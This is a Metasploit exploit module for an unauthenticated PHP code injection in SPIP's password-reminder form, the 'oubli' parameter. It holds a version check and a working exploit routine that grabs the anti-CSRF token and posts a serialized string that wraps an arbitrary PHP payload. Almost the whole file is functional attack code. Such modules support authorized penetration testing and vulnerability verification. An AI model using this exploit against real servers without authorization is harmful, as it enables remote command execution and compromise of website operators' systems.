##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'SPIP form PHP Injection',
        'Description' => %q{
          This module exploits a PHP code injection in SPIP. The vulnerability exists in the
          oubli parameter and allows an unauthenticated user to execute arbitrary commands
          with web user privileges. Branches 3.2, 4.0, 4.1 and 4.2 are concerned. Vulnerable versions
          are <3.2.18, <4.0.10, <4.1.18 and <4.2.1.
        },
        'Author' => [
          'anonymous', # Initial discovery
          'Laluka',         # PoC
          'Julien Voisin'   # MSF module
        ],
        'License' => MSF_LICENSE,
        'References' => [
          [ 'URL', 'https://blog.spip.net/Mise-a-jour-critique-de-securite-sortie-de-SPIP-4-2-1-SPIP-4-1-8-SPIP-4-0-10-et.html' ],
        ],
        'Privileged' => false,
        'Platform' => ['php'],
        'Arch' => ARCH_PHP,
        'Targets' => [
          [ 'Automatic', {} ],
        ],
        'Notes' => {
          'Stability' => [ CRASH_SAFE ],
          'Reliability' => [ REPEATABLE_SESSION ],
          'SideEffects' => []
        },
        'Payload' => {
          'BadChars' => "\x22\x00"
        },
        'DefaultTarget' => 0,
        'DisclosureDate' => '2023-02-27'
      )
    )

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The base path to SPIP application', '/']),
      ]
    )
  end

  def check
    version = nil
    uri = normalize_uri(target_uri.path, 'spip.php')
    res = send_request_cgi({ 'uri' => uri.to_s })

    if res&.code == 200
      if res.body =~ /<meta name="generator" content="SPIP (.*) \[/
        version = ::Regexp.last_match(1)
      end

      if version.nil? && res.headers['Composed-By'] =~ /SPIP (.*) @/
        version = ::Regexp.last_match(1)
      end
    end

    if version.nil?
      return Exploit::CheckCode::Unknown
    end

    print_status("SPIP Version detected: #{version}")

    if version =~ /^4\.2/ && version < '4.2.1'
      return Exploit::CheckCode::Appears
    elsif version =~ /^4\.1/ && version < '4.1.18'
      return Exploit::CheckCode::Appears
    elsif version =~ /^4\.0/ && version < '4.0.10'
      return Exploit::CheckCode::Appears
    elsif version =~ /^3\.2/ && version < '3.2.18'
      return Exploit::CheckCode::Appears
    end

    return Exploit::CheckCode::Safe
  end

  def exploit
    uri = normalize_uri(target_uri.path, 'spip.php?page=spip_pass&lang=fr')
    res = send_request_cgi({ 'uri' => uri })

    unless res&.code == 200
      fail_with(Msf::Exploit::Failure::UnexpectedReply, "Got an http code that isn't 200: #{res.code}.")
    end

    csrf = ''
    unless (node = res.get_html_document.xpath('//form//input[@name="formulaire_action_args"]')).empty?
      csrf = node.first['value']
    end

    print_status("Got anti-csrf token: #{csrf}")

    print_status("#{rhost}:#{rport} - Attempting to exploit...")
    res = send_request_cgi(
      {
        'uri' => uri,
        'method' => 'POST',
        'vars_post' => {
          'page' => 'spip_pass',
          'lang' => 'fr',
          'formulaire_action' => 'oubli',
          'formulaire_action_args' => csrf,
          'oubli' => "s:#{payload.encoded.length + 6 + 2}:\"<?php #{payload.encoded}?>\";"
        }
      }
    )
    unless res&.code == 200
      fail_with(Msf::Exploit::Failure::UnexpectedReply, "Got an http code that isn't 200 when sending the exploit: #{res.code}.")
    end
  end
end
